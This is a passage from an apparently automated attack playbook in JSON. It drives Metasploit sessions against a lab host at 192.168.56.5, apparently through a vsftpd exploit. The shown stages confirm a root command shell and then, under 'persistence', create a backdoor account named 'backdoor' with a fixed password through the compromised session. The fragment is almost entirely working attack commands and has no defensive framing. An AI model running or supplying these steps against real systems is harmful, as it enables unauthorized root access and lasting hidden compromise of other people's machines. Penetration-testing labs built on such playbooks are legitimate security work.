                    ],
                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
                },
                {
                    "stage": "persistence",
                    "description": "Create backdoor user and verify via SSH",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'id'",
                            "wait": 5
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor; echo \"backdoor:backdoorpass\" | chpasswd'",
                            "wait": 5
